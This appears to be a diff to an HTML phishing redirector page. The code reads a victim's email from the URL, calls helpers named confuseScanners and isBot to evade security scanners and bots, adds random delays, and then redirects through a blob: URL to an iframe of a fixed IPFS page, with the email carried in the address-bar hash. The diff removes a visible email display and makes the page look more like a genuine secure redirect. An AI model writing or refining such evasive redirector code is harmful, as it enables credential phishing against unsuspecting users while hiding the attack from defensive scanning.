@@ -2,35 +2,37 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Secure Blob Redirect</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Secure Redirect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        html, body { margin:0; padding:0; width:100%; height:100%; font-family:sans-serif; text-align:center; }
-        #message { margin-top:40px; font-size:18px; }
-        iframe { width:100%; height:80%; border:none; margin-top:20px; }
+        html, body {
+            margin:0; padding:0; width:100%; height:100%;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            display:flex; align-items:center; justify-content:center;
+            background: #f5f6fa;
+        }
+        #message {
+            font-size:16px; color:#333;
+        }
     </style>
 </head>
 <body>
-
-<div id="message">Loading...</div>
+<div id="message">Preparing redirect...</div>
 
 <script>
 // -------------------------------
-// CONFIG: Your fixed safe IPFS URL
+// CONFIG: Safe IPFS URL
 // -------------------------------
 const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
 
 // -------------------------------
-// Step 1 — Get optional email parameter
+// Helpers
 // -------------------------------
 function getEmail() {
     const params = new URLSearchParams(window.location.search);
     return params.get("email") || "";
 }
 
-// -------------------------------
-// Step 2 — Anti-bot helpers
-// -------------------------------
 function randomDelay(min=150, max=600) {
     return new Promise(res => setTimeout(res, Math.random() * (max - min) + min));
 }
@@ -46,39 +48,43 @@ function confuseScanners() {
 }
 
 // -------------------------------
-// Step 3 — Build blob HTML displaying email
+// Build blob content
 // -------------------------------
 function buildBlobHTML(url, email) {
     const noise = Math.random().toString(36).slice(2);
+    // Email encoded in the URL hash, so it appears in address bar
+    const hash = email ? "#" + encodeURIComponent(email) : "";
     return `
         <!DOCTYPE html>
-        <html>
+        <html lang="en">
         <head>
+            <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <style>
-                html, body { margin:0; padding:0; width:100%; height:100%; font-family:sans-serif; text-align:center; }
-                #emailDisplay { margin-top:20px; font-size:20px; color:#333; }
-                iframe { width:90%; height:70%; border:none; margin-top:20px; }
+                html, body { margin:0; padding:0; width:100%; height:100%; }
+                iframe { width:100%; height:100%; border:none; display:block; }
             </style>
         </head>
         <body data-noise="${noise}">
-            <div id="emailDisplay">Email: ${email}</div>
             <iframe src="${url}"></iframe>
+            <script>
+                // Update address bar with email hash
+                if("${email}") window.location.hash = "${encodeURIComponent(email)}";
+            </script>
         </body>
         </html>
     `;
 }
 
 // -------------------------------
-// Step 4 — Main redirect logic
+// Main logic
 // -------------------------------
 document.addEventListener("DOMContentLoaded", async () => {
-
     confuseScanners();
 
     if (isBot()) {
         document.getElementById("message").innerText = "Loading...";
-        return; // block bots
+        return;
     }
 
     await randomDelay();
@@ -90,14 +96,13 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
 
     const email = getEmail();
-    const finalURL = BASE_IPFS; // iframe points to IPFS
-    const blobHTML = buildBlobHTML(finalURL, email);
+    const blobHTML = buildBlobHTML(BASE_IPFS, email);
     const blob = new Blob([blobHTML], { type: "text/html" });
     const blobURL = URL.createObjectURL(blob);
 
+    // Redirect to blob page (email appears in address bar hash)
     window.location.href = blobURL;
 });
 </script>
-
 </body>
 </html>
